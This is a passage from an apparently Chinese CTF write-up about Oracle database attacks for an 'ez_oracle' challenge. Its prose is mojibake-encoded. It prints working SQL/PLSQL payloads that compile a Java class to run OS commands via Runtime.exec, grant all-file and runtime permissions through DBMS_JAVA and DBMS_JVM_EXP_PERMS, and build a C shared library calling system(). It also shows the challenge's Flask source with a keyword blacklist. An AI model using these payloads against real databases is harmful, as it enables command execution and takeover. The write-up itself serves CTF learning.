stemp + &quot;\n&quot;;</span></span><br><span class="line"><span class="string">                                  myReader.close();</span></span><br><span class="line"><span class="string">                                  return str;</span></span><br><span class="line"><span class="string">                              &#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="string">                                  return e.toString();</span></span><br><span class="line"><span class="string">                              &#125;</span></span><br><span class="line"><span class="string">                          &#125;</span></span><br><span class="line"><span class="string">                      &#125;&#x27;</span>;</span><br><span class="line">   <span class="keyword">COMMIT</span>;</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line"><span class="operator">/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é¦–å…ˆ Declare å¯åŠ¨åŒ¿å PL/SQL çš„ç”Ÿå‘½ï¼Œ <code>PRAGMA AUTONOMOUS_TRANSACTION;</code>  å£°æ˜è‡ªæ²»äº‹åŠ¡ã€‚è‡ªæ²»äº‹åŠ¡å…è®¸ç‹¬ç«‹äºä¸»äº‹åŠ¡æäº¤æ›´æ”¹ã€‚å½“æ‚¨æƒ³è¦æ‰§è¡ŒæŸäº›å³ä½¿ä¸»äº‹åŠ¡å›æ»šä¹Ÿåº”æäº¤çš„æ“ä½œæ—¶ï¼Œé€šå¸¸ä½¿ç”¨æ­¤æ–¹æ³•ã€‚</p><p>ç„¶åæ‰§è¡Œä¸€æ®µè¯­å¥.</p><p><code>COMMIT</code>  è¯­å¥ç”¨äºæäº¤åœ¨è‡ªæ²»äº‹åŠ¡ä¸­æ‰€åšçš„æ›´æ”¹ã€‚è¿™ç¡®ä¿äº†åœ¨æ•°æ®åº“ä¸­æ°¸ä¹…åˆ›å»ºå’Œç¼–è¯‘ Java æºä»£ç ã€‚</p><p>å…ˆåˆ›å»ºäº†ä¸€ä¸ªç±»å’Œæ–¹æ³•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select dbms_xmlquery.newcontext(<span class="string">&#x27;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#x27;</span><span class="string">&#x27;create or replace and compile java source named &quot;LinxUtil&quot; as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args) &#123;try&#123;BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str=&quot;&quot;;while ((stemp = myReader.readLine()) != null) str +=stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;&#x27;</span><span class="string">&#x27;;commit;end;&#x27;</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure><p><img src="/2023/12/22/%E4%BA%AC%E9%BA%92CTF%E8%A1%A5%E5%AE%8C%E8%AE%A1%E5%88%92/1703207275702.png" alt="1703207275702"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">declare </span><br><span class="line">   PRAGMA AUTONOMOUS_TRANSACTION;</span><br><span class="line">begin </span><br><span class="line">   execute immediate <span class="string">&#x27;create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name &#x27;</span><span class="string">&#x27;LinxUtil.runCMD(java.lang.String) return String&#x27;</span><span class="string">&#x27;;&#x27;</span>; </span><br><span class="line">   commit; </span><br><span class="line">end;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸¤ä¸ªå•æ‹¬å·ç›¸å½“äºå¯¹ä¸€ä¸ªå•æ‹¬å·çš„è½¬ä¹‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select dbms_xmlquery.newcontext(<span class="string">&#x27;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#x27;</span><span class="string">&#x27;create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name &#x27;</span><span class="string">&#x27;&#x27;&#x27;LinxUtil.runCMD(java.lang.String) return String&#x27;&#x27;&#x27;</span><span class="string">&#x27;; &#x27;</span><span class="string">&#x27;;commit;end;&#x27;</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆä¸¤ä¸ªå•æ‹¬å·é‡Œé¢ä½¿ç”¨å››ä¸ªæ‹¬å·å°±æ˜¯äºŒé‡è½¬ä¹‰äº†ï¼ˆï¼‰.</p><p><img src="/2023/12/22/%E4%BA%AC%E9%BA%92CTF%E8%A1%A5%E5%AE%8C%E8%AE%A1%E5%88%92/1703207737261.png" alt="1703207737261"></p><p>æŸ¥è¯¢å¯¹è±¡æ˜¯å¦å­˜åœ¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select OBJECT_ID <span class="keyword">from</span> all_objects where object_name =<span class="string">&#x27;LINXRUNCMD&#x27;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select linxruncmd(<span class="string">&#x27;whoami&#x27;</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure><p><img src="/2023/12/22/%E4%BA%AC%E9%BA%92CTF%E8%A1%A5%E5%AE%8C%E8%AE%A1%E5%88%92/1703207976922.png" alt="1703207976922"></p><p>æˆäº†.</p><p>å¤§ G è€å¸ˆå¦‚æ˜¯è¯´: <code>DUAL</code>  æ˜¯ Oracle æ•°æ®åº“ä¸­çš„ä¸€ä¸ªç‰¹æ®Šè¡¨ï¼Œå®ƒé€šå¸¸åŒ…å«ä¸€è¡Œä¸€åˆ—çš„æ•°æ®ã€‚ <code>DUAL</code>  è¡¨æ˜¯ä¸€ä¸ªè™šæ‹Ÿè¡¨ï¼Œä¸å­˜å‚¨ä»»ä½•å®é™…æ•°æ®ï¼Œä½†æ˜¯å®ƒåœ¨ Oracle SQL æŸ¥è¯¢å’Œ PL/SQL ä¸­ç»å¸¸è¢«ç”¨ä½œä¸€ç§æ‰‹æ®µã€‚</p><p>ä¸ç®¡å’‹è¯´ï¼ŒæŸ¥å•¥ï¼Œéƒ½è¦æŒ‡å®šè¿™ä¸ªè¡¨ï¼Œç®—æ˜¯ Oracle çš„ä¸€ä¸ªç‰¹æ€§å§.</p><h2 id="ç”¨æˆ·ç®¡ç†"><span id="ç”¨æˆ·ç®¡ç†"> ç”¨æˆ·ç®¡ç†</span></h2><h3 id="ä¸€èˆ¬ç®¡ç†"><span id="ä¸€èˆ¬ç®¡ç†"> ä¸€èˆ¬ç®¡ç†</span></h3><p>åˆ›å»ºç”¨æˆ·</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE USER username IDENTIFIED BY password;</span><br></pre></td></tr></table></figure><p><img src="/2023/12/22/%E4%BA%AC%E9%BA%92CTF%E8%A1%A5%E5%AE%8C%E8%AE%A1%E5%88%92/image-20231222094134588.png" alt="image-20231222094134588"></p><p>æˆäºˆè§’è‰²</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM DBA_ROLES;<span class="comment">#æŸ¥çœ‹æ‹¥æœ‰çš„æ’…è‰²</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/12/22/%E4%BA%AC%E9%BA%92CTF%E8%A1%A5%E5%AE%8C%E8%AE%A1%E5%88%92/image-20231222100454951.png" alt="image-20231222100454951"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GRANT role_name TO <span class="string">&quot;1llstrious&quot;</span>;</span><br><span class="line">GRANT CWM_USER TO illustrious;</span><br></pre></td></tr></table></figure><p><img src="/2023/12/22/%E4%BA%AC%E9%BA%92CTF%E8%A1%A5%E5%AE%8C%E8%AE%A1%E5%88%92/1703209406453.png" alt="1703209406453"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM DBA_TAB_PRIVS where GRANTEE = <span class="string">&#x27;SYS&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="/2023/12/22/%E4%BA%AC%E9%BA%92CTF%E8%A1%A5%E5%AE%8C%E8%AE%A1%E5%88%92/1703210837822.png" alt="1703210837822"></p><p>æ”¹å¯†ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ALTER USER username IDENTIFIED BY new_password;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/12/22/%E4%BA%AC%E9%BA%92CTF%E8%A1%A5%E5%AE%8C%E8%AE%A1%E5%88%92/1703211009810.png" alt="1703211009810"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ALTER USER illustrious ACCOUNT LOCK;</span><br><span class="line">ALTER USER illustrious ACCOUNT UNLOCK;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é”å®šå’Œè§£é”ç”¨æˆ·</p><h3 id="dbms_javagrant_permission-èµ‹æƒ"><span id="dbms_javagrant_permission-èµ‹æƒ"> dbms_java.grant_permission èµ‹æƒ</span></h3><p>åœ¨ Oracle æ•°æ®åº“ä¸­ï¼Œ <code>DBMS_JAVA.GRANT_PERMISSION</code>  æ˜¯ä¸€ä¸ªè¿‡ç¨‹ï¼Œç”¨äºä¸º Java ç±»æˆ–èµ„æºæˆäºˆæƒé™ã€‚è¿™ä¸ªè¿‡ç¨‹é€šå¸¸ç”¨äºåœ¨ Oracle æ•°æ®åº“ä¸­æ‰§è¡Œ Java ç±»çš„æ“ä½œæ—¶ç®¡ç† Java å®‰å…¨æ€§ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DBMS_JAVA.GRANT_PERMISSION(</span><br><span class="line">   grantee         IN VARCHAR2,</span><br><span class="line">   permission_type IN VARCHAR2,</span><br><span class="line">   permission_name IN VARCHAR2,</span><br><span class="line">   permission_path IN VARCHAR2,</span><br><span class="line">   permission_action IN VARCHAR2</span><br><span class="line">);</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><code>grantee</code> : æˆäºˆæƒé™çš„ç”¨æˆ·æˆ–è§’è‰²çš„åç§°ã€‚</li><li><code>permission_type</code> : æƒé™çš„ç±»å‹ï¼Œé€šå¸¸æ˜¯  <code>'java.io.FilePermission'</code>  æˆ–  <code>'java.lang.RuntimePermission'</code> ã€‚</li><li><code>permission_name</code> : æƒé™çš„åç§°ï¼Œé€šå¸¸æ˜¯æ–‡ä»¶è·¯å¾„ï¼ˆå¯¹äºæ–‡ä»¶æƒé™ï¼‰æˆ–æ“ä½œï¼ˆå¯¹äºè¿è¡Œæ—¶æƒé™ï¼‰ã€‚</li><li><code>permission_path</code> : æ–‡ä»¶è·¯å¾„ï¼Œä»…åœ¨  <code>permission_type</code>  ä¸º  <code>'java.io.FilePermission'</code>  æ—¶ä½¿ç”¨ã€‚</li><li><code>permission_action</code> : æ“ä½œï¼Œä»…åœ¨  <code>permission_type</code>  ä¸º  <code>'java.lang.RuntimePermission'</code>  æ—¶ä½¿ç”¨ã€‚</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">begin</span><br><span class="line">dbms_java.grant_permission(<span class="string">&#x27;SYSTEM&#x27;</span>, <span class="string">&#x27;SYS:java.io.FilePermission&#x27;</span>, <span class="string">&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;</span>, <span class="string">&#x27;read,write,execute,delete&#x27;</span>);</span><br><span class="line">end;</span><br><span class="line">/</span><br></pre></td></tr></table></figure><p><img src="/2023/12/22/%E4%BA%AC%E9%BA%92CTF%E8%A1%A5%E5%AE%8C%E8%AE%A1%E5%88%92/1703211934218.png" alt="1703211934218"></p><p>èµ‹äºˆæ–‡ä»¶è®¿é—®æƒé™.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BEGIN</span><br><span class="line">   DBMS_JAVA.GRANT_PERMISSION(<span class="string">&#x27;SYSTEM&#x27;</span>, <span class="string">&#x27;SYS:java.lang.RuntimePermission&#x27;</span>, <span class="string">&#x27;writeFileDescriptor&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">END;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">begin</span><br><span class="line">dbms_java.grant_permission(<span class="string">&#x27;SYSTEM&#x27;</span>, <span class="string">&#x27;SYS:java.lang.Runt&#x27;</span>||<span class="string">&#x27;imePermission&#x27;</span>, <span class="string">&#x27;readFileDesc&#x27;</span>||<span class="string">&#x27;riptor&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">end;</span><br></pre></td></tr></table></figure><p>èƒ½å¤Ÿè¯»å†™</p><p>å…¶å®ƒçš„ä¸€äº›</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">DECLARE</span><br><span class="line">POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;</span><br><span class="line">CURSOR C1 IS SELECT <span class="string">&#x27;GRANT&#x27;</span>,USER(),<span class="string">&#x27;SYS&#x27;</span>,<span class="string">&#x27;java.io.FilePermission&#x27;</span>,<span class="string">&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;</span>,<span class="string">&#x27;execute&#x27;</span>,<span class="string">&#x27;ENABLED&#x27;</span> FROM DUAL;</span><br><span class="line">BEGIN</span><br><span class="line">OPEN C1;</span><br><span class="line">FETCH C1 BULK COLLECT INTO POL;</span><br><span class="line">CLOSE C1;</span><br><span class="line">DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);</span><br><span class="line">END;</span><br><span class="line">/</span><br><span class="line">DECLARE</span><br><span class="line">POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;</span><br><span class="line">CURSOR C1 IS SELECT <span class="string">&#x27;GRANT&#x27;</span>,USER(),<span class="string">&#x27;SYS&#x27;</span>,<span class="string">&#x27;java.lang.RuntimePermission&#x27;</span>,<span class="string">&#x27;writeFileDescriptor&#x27;</span>,NULL,<span class="string">&#x27;ENABLED&#x27;</span> FROM DUAL;</span><br><span class="line">BEGIN</span><br><span class="line">OPEN C1;</span><br><span class="line">FETCH C1 BULK COLLECT INTO POL;</span><br><span class="line">CLOSE C1;</span><br><span class="line">DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);</span><br><span class="line">END;</span><br><span class="line">/</span><br><span class="line">DECLARE</span><br><span class="line">POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;</span><br><span class="line">CURSOR C1 IS SELECT <span class="string">&#x27;GRANT&#x27;</span>,USER(),<span class="string">&#x27;SYS&#x27;</span>,<span class="string">&#x27;java.lang.RuntimePermission&#x27;</span>,<span class="string">&#x27;readFileDescriptor&#x27;</span>,NULL,<span class="string">&#x27;ENABLED&#x27;</span> FROM DUAL;</span><br><span class="line">BEGIN</span><br><span class="line">OPEN C1;</span><br><span class="line">FETCH C1 BULK COLLECT INTO POL;</span><br><span class="line">CLOSE C1;</span><br><span class="line">DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);</span><br><span class="line">END;</span><br><span class="line">/</span><br></pre></td></tr></table></figure><h2 id="ä¸€äº›å…¶å®ƒçš„è¾…åŠ©è¯­å¥"><span id="ä¸€äº›å…¶å®ƒçš„è¾…åŠ©è¯­å¥"> ä¸€äº›å…¶å®ƒçš„è¾…åŠ©è¯­å¥</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SHOW ERRORS FUNCTION your_function_name;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ’æŸ¥åˆ›å»ºå‡½æ•°æ—¶çš„é”™è¯¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT OBJECT_NAME, OBJECT_TYPE</span><br><span class="line">FROM ALL_OBJECTS</span><br><span class="line">WHERE OBJECT_TYPE = <span class="string">&#x27;FUNCTION&#x27;</span> AND OWNER = <span class="string">&#x27;system&#x27;</span>;</span><br></pre></td></tr></table></figure><p>å¿«é€Ÿè¿æ¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlplus username/password<span class="meta">@ip</span>:port/service_name</span><br></pre></td></tr></table></figure><h1 id="ez_oracle"><span id="ez_oracle"> ez_oracle</span></h1><p>è¿™å›äº‹ä¸€ä¸ª orcle æ•°æ®åº“ï¼Œå…¨æ–°çš„ä¸œè¥¿ï¼Œå€Ÿæ­¤æœºä¼šå­¦ä¸€ä¸‹.</p><h2 id="æºç é‰´èµä¸€ä¸‹"><span id="æºç é‰´èµä¸€ä¸‹"> æºç é‰´èµä¸€ä¸‹</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> oracledb</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">username = <span class="string">&quot;system&quot;</span></span><br><span class="line">password = <span class="string">&quot;PaAasSSsSwoRrRDd&quot;</span></span><br><span class="line">ol_server = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">ol_port = <span class="number">1521</span></span><br><span class="line">sid = <span class="string">&quot;orcl&quot;</span></span><br><span class="line">dsn = <span class="string">&quot;&#123;&#125;:&#123;&#125;/&#123;&#125;&quot;</span>.<span class="built_in">format</span>(ol_server, ol_port, sid)</span><br><span class="line">logging.basicConfig(level=logging.INFO, filename=<span class="string">&#x27;/var/log/web.log&#x27;</span>, <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s %(message)s&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">sql</span>):</span><br><span class="line">    blacklist = [<span class="string">&quot;select&quot;</span>, <span class="string">&quot;insert&quot;</span>, <span class="string">&quot;delete&quot;</span>, <span class="string">&quot;update&quot;</span>, <span class="string">&quot;table&quot;</span>, <span class="string">&quot;user&quot;</span>, <span class="string">&quot;drop&quot;</span>, <span class="string">&quot;alert&quot;</span>, <span class="string">&quot;procedure&quot;</span>, <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                 <span class="string">&quot;open&quot;</span>, <span class="string">&quot;:=&quot;</span>, <span class="string">&quot;declare&quot;</span>, <span class="string">&quot;runtime&quot;</span>, <span class="string">&quot;process&quot;</span>, <span class="string">&quot;invoke&quot;</span>, <span class="string">&quot;newinstance&quot;</span>, <span class="string">&quot;parse&quot;</span>,</span><br><span class="line">                 <span class="string">&quot;.class&quot;</span>, <span class="string">&quot;loader&quot;</span>, <span class="string">&quot;script&quot;</span>, <span class="string">&quot;url&quot;</span>, <span class="string">&quot;xml&quot;</span>, <span class="string">&quot;method&quot;</span>, <span class="string">&quot;field&quot;</span>, <span class="string">&quot;reflect&quot;</span>, <span class="string">&quot;defineclass&quot;</span>,</span><br><span class="line">                 <span class="string">&quot;getclass&quot;</span>, <span class="string">&quot;forname&quot;</span>, <span class="string">&quot;constructor&quot;</span>, <span class="string">&quot;transform&quot;</span>, <span class="string">&quot;sql&quot;</span>, <span class="string">&quot;beans&quot;</span>, <span class="string">&quot;.net&quot;</span>, <span class="string">&quot;http&quot;</span>, <span class="string">&quot;.rmi&quot;</span>, <span class="string">&quot;naming&quot;</span></span><br><span class="line">                 ]</span><br><span class="line">    sql = sql.lower()</span><br><span class="line">    <span class="keyword">for</span> blackword <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> blackword <span class="keyword">in</span> sql:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log</span>(<span class="params">ip, sql, error=<span class="literal">None</span></span>):</span><br><span class="line">    error_text = <span class="string">&quot;-----------------------&#123;&#125;-----------------------\n&quot;</span>.<span class="built_in">format</span>(ip)</span><br><span class="line">    error_text += <span class="string">&quot;sql: &#123;&#125; \n&quot;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">    <span class="keyword">if</span> error != <span class="literal">None</span>:</span><br><span class="line">        error_text += <span class="string">&quot;error: &#123;&#125; \n&quot;</span>.<span class="built_in">format</span>(error)</span><br><span class="line">    error_text += <span class="string">&quot;-------------------------------------------------&quot;</span></span><br><span class="line">    logging.error(error_text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/query&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query</span>():</span><br><span class="line">    sql = request.form[<span class="string">&quot;sql&quot;</span>]</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span> check(sql):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;waf&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            conn = oracledb.connect(user=username, password=password, dsn=dsn)</span><br><span class="line">            conn.callTimeout = <span class="number">5000</span></span><br><span class="line">            cursor = conn.cursor()</span><br><span class="line">            cursor.execute(sql)</span><br><span class="line">            cursor.close()</span><br><span class="line">            conn.close()</span><br><span class="line">            log(ip, sql)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            log(ip, sql, e)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;query success&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8888</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥æ‰§è¡Œä»»æ„ sql è¯­å¥ï¼Œä½†æ˜¯ ban äº†ä¸€å †ä¸œè¥¿.</p><p>ä¸èƒ½åå°„è·å–ç±»ï¼Œæ–¹æ³•ï¼Œä¹Ÿä¸èƒ½é€šè¿‡ <code>:=</code>  æ‰§è¡Œä¸€äº›å‘½ä»¤.</p><h2 id="external-precedure"><span id="external-precedure"> External Precedure</span></h2><p>â€œExternal Procedureâ€ é€šå¸¸æ˜¯æŒ‡ä¸€ç§æ•°æ®åº“ç¼–ç¨‹çš„æ¦‚å¿µï¼Œç‰¹åˆ«æ˜¯åœ¨ Oracle æ•°æ®åº“ä¸­ã€‚åœ¨ Oracle ä¸­ï¼ŒExternal Procedure æ˜¯æŒ‡ä¸€ç§ä»¥å¤–éƒ¨ç¼–ç¨‹è¯­è¨€ï¼ˆé€šå¸¸æ˜¯ C è¯­è¨€æˆ–ç±»ä¼¼çš„ç¼–ç¨‹è¯­è¨€ï¼‰ç¼–å†™çš„ã€ç”±æ•°æ®åº“è°ƒç”¨çš„è¿‡ç¨‹ã€‚</p><p>è¯´äººè¯ï¼ŒåŠ è½½ä¸€ä¸ªå¤–éƒ¨ç¼–è¯‘çš„ C ç¨‹åºï¼Œæ‰§è¡Œæ–¹æ³•.</p><p>ä»¥ä¸‹æ˜¯ç¼–å†™åˆ©ç”¨çš„è¿‡ç¨‹:</p><p>é¦–å…ˆåˆ›é€ ä¸€ä¸ª C æ–‡ä»¶:exp.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;exp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* <span class="title function_">cmd</span><span class="params">(<span class="type">char</span>* command)</span>&#123;</span><br><span class="line">    system(cmd);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†™ä¸€ä¸ª exp.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> exp_h_</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> exp_h_</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span>* <span class="title function_">cmd</span><span class="params">(<span class="type">char</span>* command)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc exp.c -shared -fPIC -I ./ -o exp.so</span><br></pre></td></tr></table></figure><p>åŠ è½½åˆ°æ•°æ®åº“ä¸­</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> REPLACE <span class="keyword">AND</span> COMPILE JAVA SOURCE NAMED SampleJavaProcedure <span class="keyword">AS</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åˆ›å»ºå­˜å‚¨è¿‡ç¨‹</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> REPLACE <span class="keyword">PROCEDURE</span> RunJavaProcedure <span class="keyword">AS</span></span><br><span class="line"><span class="keyword">LANGUAGE</span> JAVA</span><br><span class="line">NAME <span class="string">&#x27;SampleJavaProcedure.sampleProcedure()&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿è¡Œ</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">    RunJavaProcedure;</span><br><span class="line"><span class="keyword">END</span>;</span><br><span 